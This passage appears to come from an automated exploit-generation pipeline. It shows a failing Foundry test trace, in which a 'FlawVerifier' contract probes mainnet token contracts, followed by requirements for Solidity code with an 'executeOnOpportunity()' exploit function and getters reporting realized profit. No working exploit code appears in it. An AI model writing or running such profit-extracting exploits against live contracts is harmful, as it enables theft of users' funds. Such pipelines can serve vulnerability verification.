    │   ├─ [7531] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::flpTokenFactory() [staticcall]
    │   │   ├─ [250] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::flpTokenFactory() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [7530] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::flashProtocol() [staticcall]
    │   │   ├─ [249] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::flashProtocol() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2539] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::flpTokenFactory() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [2539] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::flashProtocol() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [270] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::flpTokenFactory() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [270] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::flashProtocol() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [450] 0xEE083E0F0f5dE2ff34662F1ef6f76d897d5047EF::owner() [staticcall]
    │   │   └─ ← [Return] 0x612ef87bfcd858687160294b0eFFACA0CBA342E2
    │   ├─ [1037] 0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E::owner() [staticcall]
    │   │   ├─ [875] 0x44D1C6b94B282c678c95B7f4B18de5A53EA4Fa9f::owner() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [494] 0xEE083E0F0f5dE2ff34662F1ef6f76d897d5047EF::yieldVault() [staticcall]
    │   │   └─ ← [Return] 0x3e55AC0E6724BBe8aB40a60771B5D60fC8e93404
    │   ├─ [699] 0x3e55AC0E6724BBe8aB40a60771B5D60fC8e93404::owner() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [1037] 0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E::owner() [staticcall]
    │   │   ├─ [875] 0x44D1C6b94B282c678c95B7f4B18de5A53EA4Fa9f::owner() [delegatecall]
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [450] 0xEE083E0F0f5dE2ff34662F1ef6f76d897d5047EF::owner() [staticcall]
    │   │   └─ ← [Return] 0x612ef87bfcd858687160294b0eFFACA0CBA342E2
    │   ├─ [246] 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F::owner() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2382] 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd::owner() [staticcall]
    │   │   └─ ← [Return] 0x9a8541Ddf3a932a9A922B607e9CF7301f1d47bD1
    │   ├─ [699] 0x3e55AC0E6724BBe8aB40a60771B5D60fC8e93404::owner() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2437] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::owner() [staticcall]
    │   │   └─ ← [Return] 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd
    │   ├─ [248] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::owner() [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [9664] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::owner() [staticcall]
    │   │   ├─ [2381] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::owner() [delegatecall]
    │   │   │   └─ ← [Return] 0xFcb19e6a322b27c06842A71e8c725399f049AE3a
    │   │   └─ ← [Return] 0xFcb19e6a322b27c06842A71e8c725399f049AE3a
    │   ├─ [2539] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::owner() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [437] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::owner() [staticcall]
    │   │   └─ ← [Return] 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd
    │   └─ ← [OutOfGas] EvmError: OutOfGas
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x44D1C6b94B282c678c95B7f4B18de5A53EA4Fa9f.owner
  at 0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E.owner
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.78s (1.59s CPU time)

Ran 1 test suite in 1.86s (1.78s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1056944164)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
